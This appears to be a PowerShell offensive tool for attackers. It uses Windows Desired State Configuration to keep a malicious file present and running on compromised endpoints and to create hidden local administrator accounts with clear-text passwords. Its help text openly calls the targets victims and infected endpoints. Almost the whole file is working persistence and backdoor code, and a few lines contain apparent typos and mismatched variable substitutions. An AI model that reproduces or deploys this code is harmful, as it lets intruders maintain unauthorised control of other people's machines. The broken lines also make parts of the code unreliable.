function Generate-Configuration {
    

    [CmdletBinding()] Param(
    [Parameter(Mandatory = $True)]
    [Object[]] $objArray
    )
    # Create GUID for configuration
    $Guid = [guid]::NewGuid()
    

    Configuration CombinedConfig {
        Param(
        [Parameter(Mandatory = $True)]
        [String[]] $NodeGUID
        )
        Node $NodeGUID {
            foreach ($configobj in $objArray){
                Write-Host $configobj.Type
                If ($configobj.Type -eq "Payload") {
                    $FileBytes = [System.IO.File]::ReadAllBytes($configobj.Sourcefile)
                    CreatePayload $configobj.DestinationPath {}
                }
                ElseIf ($configobj.Type -eq "User") {
                    Write-Host "here"
                    CreateAdmin $configobj.Username {}

                }
            }

        }

    }

   Configuration CreatePayload {

        Script Ensure-File {
            SetScript = $([string]{
                $bytes = [byte[]]($FileBytes).split(' ')
                [System.IO.File]::WriteAllBytes($configobj.DestinationPath, $bytes)
            }).Replace('$FileBytes', "'$FileBytes'").Replace('$DestinationPath', "'$configobj.DestinationPath'")
                
            TestScript = $([string]{
                Test-Path $configobj.DestinationPa
            }).Replace('$DestinationPath', "'$configobj.DestinationPath'")

            GetScript = {
                return @{
                    GetScript 	= $GetScript
                    SetScript 	= $SetScript
                    TestScript 	= $TestScript
                }
            }
        }
        Script Ensure-Process {
            SetScript = $([string]{
                Start-Process $configobj.DestinationPath $configobj.Arguments
            }).Replace('$DestinationPath', "'$configobj.DestinationPath'").Replace('$Arguments', "'$configobj.Arguments'")
            TestScript = $([string]{
                (get-process).path -contains $configobj.DestinationPath
            }).Replace('$DestinationPath', "'$configobj.DestinationPath'")
                    
            GetScript = {
                return @{
                    GetScript 	= $GetScript
                    SetScript 	= $SetScript
                    TestScript 	= $TestScript
                }
            }
        }        
         
    }

    $configData = @{
        AllNodes = @(
                        @{
                            NodeName = [string]$Guid;
                            PSDscAllowPlainTextPassword = $true
                            }
            )
        }

    Configuration CreateAdmin {
        
        $pass = ConvertTo-SecureString $configobj.Password -AsPlainText -Force 
        $credObject = New-Object System.Management.Automation.PSCredential($configobj.Username, $pass)

        

        User newUser {
            UserName                 = $configobj.Username
            Password                 = $credObject
            PasswordNeverExpires     = $false
            Ensure                   = "Present"
        }
        Group Admins {
            Ensure               = "Present"
            GroupName            = $configobj.Group
            MembersToInclude     = $configobj.Username
            DependsOn            = "[User]newUser"

            
            } 
    }

CombinedConfig -NodeGUID $Guid -ConfigurationData $configData


}


function Configure-User {
<#
.SYNOPSIS

Initiates a user object to be used in configuring DSC pull server

.DESCRIPTION

Returns a create user object. This object is to passed to"Generate-Configuration" when creating a user configuration.


.PARAMETER Username

Name of account to be created on endpoints.
If not given at the command line this propery must be set before running "Generate-Configuration".

.PARAMETER Password

Password used for user account. Password must meet complexity requirements of any infected endpoint or user account will not be created.
If not given at the command line this propery must be set before running "Generate-Configuration".
Note: Password is stored in clear text within the MOF file.

.PARAMETER Group

Optionally specifies the group the user should be added to. Default is 'Adminstrators'. 

.EXAMPLE

PS C:\> Configure-User -Username test_user -Password Long_And_Complex!

Description
-----------

Creates an object for the user account 'test_user' with password 'Long_And_Complex!' and adds user to local administrators group.


.EXAMPLE


PS C:\> Configure-User -Username test_user -Password Long_And_Complex! -Group RemoteAdmins

Description
-----------
Creates an object for the user account 'test_user' with password 'Long_And_Complex!' and adds user to local 'RemoteAdmins' group. 


#>
    [CmdletBinding()] Param(
    [Parameter(Mandatory = $False)]
    [String] $Username = "",

    [Parameter(Mandatory = $False)]
    [String] $Password = "",

    [Parameter(Mandatory = $False)]
    [String] $Group = "Administrators"
    )

    $newUserObject = New-Object -TypeName PSObject
    $newUserObject | Add-Member -MemberType NoteProperty -Name Username -Value $Username
    $newUserObject | Add-Member -MemberType NoteProperty -Name Password -Value $Password
    $newUserObject | Add-Member -MemberType NoteProperty -Name Group -Value $Group
    $newUserObject | Add-Member -MemberType NoteProperty -Name Type -Value "User"

    return $newUserObject
}


function Configure-Payload
{
<#
.SYNOPSIS

Initiates a payload object for file and process persistence 

.DESCRIPTION

Script ensures a file is present and running on a compromised endpoint.
This object is to passed to"Generate-Configuration" when creating a user configuration.

Must be run on the DSC server before configuring any endpoints.

Malicious file must be present server side at time of initial configuration.

.PARAMETER SourceFile

Local path to the malicious file that will persistent on compromised endpoints. 
If not given at the command line this propery must be set before running "Generate-Configuration".

.PARAMETER DestinationPath

Location on compromised endpoints where the contents of 'SourceFile' should be written on compromomised endpoints. 
If not given at the command line this propery must be set before running "Generate-Configuration". 

.PARAMETER Arguments

Optionally specifies command line arguments provided to during execution.

.EXAMPLE


PS C:\> Configure-Payload -SourceFile C:\Windows\System32\calc.exe -DestinationPath C:\calc.exe

Description
-----------
Server Side:
Creates an object which points to C:\Windows\System32\calc.exe which will be read into configuration

Victim Side:
Creates file C:\calc.exe with contents of C:\Windows\System32\calc.exe and ensures file is running
If file is deleted or process is stopped script will recreate file and/or relaunch process

#>
    
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False)]
        [String] $SourceFile = "",

        [Parameter(Mandatory = $False)]
        [String] $DestinationPath = "",

        [Parameter(Mandatory = $False)]
        [String] $Arguments 

    )

    $newPayloadObject = New-Object -TypeName PSObject
    $newPayloadObject | Add-Member -MemberType NoteProperty -Name SourceFile -Value $SourceFile
    $newPayloadObject | Add-Member -MemberType NoteProperty -Name DestinationPath -Value $DestinationPath
    $newPayloadObject | Add-Member -MemberType NoteProperty -Name Arguments -Value $Arguments
    $newPayloadObject | Add-Member -MemberType NoteProperty -Name Type -Value "Payload"

    return $newPayloadObject
}
